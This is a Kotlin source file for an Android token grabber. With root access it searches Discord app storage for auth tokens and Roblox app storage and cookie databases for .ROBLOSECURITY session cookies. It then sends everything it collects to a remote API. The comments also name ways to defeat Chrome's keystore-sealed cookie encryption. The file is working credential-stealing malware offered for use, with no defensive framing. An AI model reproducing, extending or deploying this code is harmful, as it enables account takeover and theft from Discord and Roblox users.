package com.agent.service

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.regex.Pattern

/**
 * Rooted token drag:
 *  - Discord: walk /data/data/com.discord*/ for leveldb files, regex for tokens
 *  - Roblox: walk /data/data/com.roblox.client/ for .ROBLOSECURITY in
 *    shared_prefs, app_webview cookies DB (plaintext rows only), and files
 *
 * Chrome's cookie DB is AES-GCM encrypted with a key sealed by the Android
 * Keystore under Chrome's UID. Extracting it requires a keystore hook
 * (Frida / libkeystore patching) or UID context — out of scope here.
 * This module reads DBs where values are already plaintext.
 */
object TokenDragger {

    private const val TAG = "TokenDragger"

    private val DISCORD_RE = Pattern.compile(
        "[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27,38}" +
        "|mfa\\.[\\w-]{84}"
    )

    private val DISCORD_DIRS = listOf(
        "/data/data/com.discord",
        "/data/data/com.discordcanary",
        "/data/data/com.discordptb"
    )

    private val ROBLOX_ROOT = "/data/data/com.roblox.client"

    data class Token(val kind: String, val token: String, val source: String, val ts: Long)

    suspend fun drag(ctx: Context): List<Token> = withContext(Dispatchers.IO) {
        if (!RootShell.available()) {
            Log.w(TAG, "root not available")
            return@withContext emptyList()
        }
        val out = mutableListOf<Token>()
        out += grabDiscord()
        out += grabRoblox(ctx)
        if (out.isNotEmpty()) {
            val json = JSONObject().put("tokens", JSONArray().apply {
                out.forEach { t ->
                    put(JSONObject().apply {
                        put("kind", t.kind)
                        put("token", t.token)
                        put("source", t.source)
                        put("ts", t.ts / 1000.0)
                    })
                }
            }).toString()
            ApiClient.postTokens(json)
        }
        out
    }

    // ----- Discord -----
    private fun grabDiscord(): List<Token> {
        val found = linkedMapOf<String, String>()  // token -> source
        for (root in DISCORD_DIRS) {
            if (!RootShell.isDir(root)) continue
            walk(root) { path ->
                if (path.endsWith(".ldb") || path.endsWith(".log")) {
                    val bytes = RootShell.readFile(path) ?: return@walk
                    val text = bytes.toString(Charsets.UTF_8)
                    val m = DISCORD_RE.matcher(text)
                    while (m.find()) found[m.group()] = path
                }
            }
        }
        return found.map { (tok, src) ->
            Token("discord", tok, src, System.currentTimeMillis())
        }
    }

    // ----- Roblox -----
    private fun grabRoblox(ctx: Context): List<Token> {
        if (!RootShell.isDir(ROBLOX_ROOT)) return emptyList()
        val out = mutableListOf<Token>()

        // 1) shared_prefs — look for a plaintext .ROBLOSECURITY
        val prefDir = "$ROBLOX_ROOT/shared_prefs"
        for (name in RootShell.listDir(prefDir)) {
            if (!name.endsWith(".xml")) continue
            val bytes = RootShell.readFile("$prefDir/$name") ?: continue
            val text = bytes.toString(Charsets.UTF_8)
            extractRobloxCookie(text)?.let {
                out += Token("roblox", it, "$prefDir/$name", System.currentTimeMillis())
            }
        }

        // 2) app_webview cookies DB — plaintext rows only
        val dbPaths = listOf(
            "$ROBLOX_ROOT/app_webview/Default/Cookies",
            "$ROBLOX_ROOT/app_webview/Cookies"
        )
        for (db in dbPaths) {
            if (!RootShell.run("[ -f '$db' ] && echo yes").text.contains("yes")) continue
            copyAndReadCookies(ctx, db)?.let {
                out += Token("roblox", it, db, System.currentTimeMillis())
            }
        }

        // 3) plaintext files under files/
        walk("$ROBLOX_ROOT/files") { path ->
            val bytes = RootShell.readFile(path) ?: return@walk
            val text = bytes.toString(Charsets.UTF_8)
            extractRobloxCookie(text)?.let {
                out += Token("roblox", it, path, System.currentTimeMillis())
            }
        }

        return out.distinctBy { it.token }
    }

    private fun extractRobloxCookie(text: String): String? {
        // .ROBLOSECURITY cookies are UUID-like (base64/urlsafe, 32+ chars)
        val m = Regex("\\.ROBLOSECURITY[\"\\s:>]+([A-Z0-9_\\-]{40,})").find(text)
            ?: Regex("ROBLOSECURITY[^A-Za-z0-9]+([A-Z0-9_\\-]{40,})").find(text)
        return m?.groupValues?.get(1)
    }

    private fun copyAndReadCookies(ctx: Context, dbPath: String): String? {
        return try {
            val tmp = File(ctx.cacheDir, "cookies_${System.nanoTime()}.db")
            val r = RootShell.run("cp '$dbPath' '${tmp.absolutePath}' && chmod 644 '${tmp.absolutePath}'")
            if (r.code != 0 || !tmp.exists()) return null
            val db = android.database.sqlite.SQLiteDatabase.openDatabase(
                tmp.absolutePath, null, android.database.sqlite.SQLiteDatabase.OPEN_READONLY
            )
            var result: String? = null
            db.rawQuery(
                "SELECT value FROM cookies WHERE name='.ROBLOSECURITY'", null
            ).use { c ->
                if (c.moveToFirst()) {
                    val v = c.getString(0)
                    if (v != null && v.length >= 40 && !v.startsWith("v10") && !v.startsWith("v11")) {
                        result = v
                    }
                }
            }
            db.close()
            tmp.delete()
            result
        } catch (e: Exception) {
            Log.w(TAG, "cookie read fail: ${e.message}")
            null
        }
    }

    // ----- walker -----
    private fun walk(root: String, onFile: (String) -> Unit) {
        val stack = ArrayDeque<String>()
        stack.add(root)
        var budget = 5000
        while (stack.isNotEmpty() && budget-- > 0) {
            val dir = stack.removeFirst()
            for (entry in RootShell.listDir(dir)) {
                val path = "$dir/$entry"
                val stat = RootShell.run("[ -d '$path' ] && echo d || echo f").text
                if (stat.startsWith("d")) stack.add(path) else onFile(path)
            }
        }
    }
}
